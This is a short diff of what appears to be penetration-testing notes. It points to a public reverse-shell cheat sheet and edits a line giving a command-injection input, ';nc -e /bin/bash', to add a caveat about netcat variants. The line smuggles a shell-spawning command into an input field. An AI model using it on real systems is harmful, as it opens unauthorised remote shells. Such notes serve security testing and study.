@@ -2,4 +2,4 @@ Reverse Shell options can be found here
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
 a simple input command to get a reverse shell is:
-;nc -e /bin/bash
+;nc -e /bin/bash //note: some variants of netcat don't support the -e option
